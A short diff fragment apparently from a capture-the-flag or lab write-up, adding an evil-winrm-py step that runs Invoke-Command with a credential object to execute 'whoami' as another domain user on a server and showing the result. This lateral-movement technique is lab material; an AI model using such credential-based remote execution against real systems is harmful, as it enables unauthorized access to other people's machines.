@@ -632,6 +632,13 @@ evil-winrm-py PS C:\Temp> $cred = New-Object System.Management.Automation.PSCred
 Once again ill set up another credential for the new user
 
 ```python
+evil-winrm-py PS C:\Temp> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {whoami} -Credential $cred -ConfigurationName dc_manage
+acute\awallace
+```
+
+And this proves i can execute commands as this user
+
+```python
 
 ```
 
